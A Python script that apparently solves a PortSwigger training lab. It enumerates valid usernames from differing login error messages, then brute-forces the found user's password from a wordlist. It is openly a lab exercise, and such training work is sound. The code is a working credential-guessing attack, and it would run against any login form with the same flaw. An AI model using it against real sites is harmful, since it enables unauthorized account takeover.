#!/usr/bin/env python3
"""
Solve the PortSwigger lab "Username enumeration via different responses".

The login page returns different messages for a wrong username ("Invalid
username") vs. a wrong password ("Incorrect password"). That difference
leaks which usernames are valid. This script enumerates a valid username
from a wordlist, then brute-forces that user's password.

Wordlists: download the lab's "Candidate usernames" and "Candidate
passwords" lists and save them next to this script as usernames.txt and
passwords.txt. Run the script from inside this folder.

Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import sys
import argparse
import requests

# Verify TLS against the OS trust store (works on networks that inspect HTTPS).
import truststore
truststore.inject_into_ssl()

session = requests.Session()
LAB_URL = None  # set from the CLI arg in main()
REQUEST_TIMEOUT = 10

# Response markers that tell the two failure cases apart.
INVALID_USERNAME = "Invalid username"     # shown when the username doesn't exist
WRONG_PASSWORD = "Incorrect password"     # shown when the username IS valid


def fetch(path, method="GET", data=None, allow_redirects=True):
    """Send a request to the lab and return the response.

    `data` is a dict of form fields for POST. `allow_redirects=False` lets
    you see a 302 rather than following it (needed to spot a login success).
    """
    url = LAB_URL.rstrip("/") + "/" + path.lstrip("/")
    return session.request(method, url, data=data, timeout=REQUEST_TIMEOUT,
                           allow_redirects=allow_redirects)


def report(name, found, detail=""):
    """Print a finding in a consistent [FOUND] / [clean] format."""
    tag = "FOUND" if found else "clean"
    print(f"[{tag}] {name}: {detail}")


def load_wordlist(filename):
    """Read a wordlist file into a list of lines (blank lines skipped)."""
    with open(filename) as f:
        return [line.strip() for line in f if line.strip()]


def enumerate_username(usernames):
    """Return the valid username, or None if none of the candidates work."""
    for username in usernames:
        response = fetch("login", method="POST",
                         data={"username": username, "password": "x"})
        if WRONG_PASSWORD in response.text:
            return username
    return None


def bruteforce_password(username, passwords):
    """Return the password for `username`, or None if none work."""
    for password in passwords:
        response = fetch("login", method="POST",
                         data={"username": username, "password": password},
                         allow_redirects=False)
        if response.status_code == 302:
            return password
    return None


def check_authentication():
    usernames = load_wordlist("usernames.txt")
    passwords = load_wordlist("passwords.txt")

    username = enumerate_username(usernames)
    if not username:
        report("Auth brute-force", False, "no valid username found")
        return

    password = bruteforce_password(username, passwords)
    if not password:
        report("Auth brute-force", False, f"found user '{username}' but no password")
        return

    report("Auth brute-force", True, f"credentials: {username} / {password}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Enumerate a username and brute-force its password (PortSwigger lab)."
    )
    parser.add_argument(
        "url",
        help="Base URL of your lab instance, e.g. https://XXXX.web-security-academy.net",
    )
    return parser.parse_args()


def main():
    global LAB_URL
    args = parse_args()
    LAB_URL = args.url

    try:
        check_authentication()
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()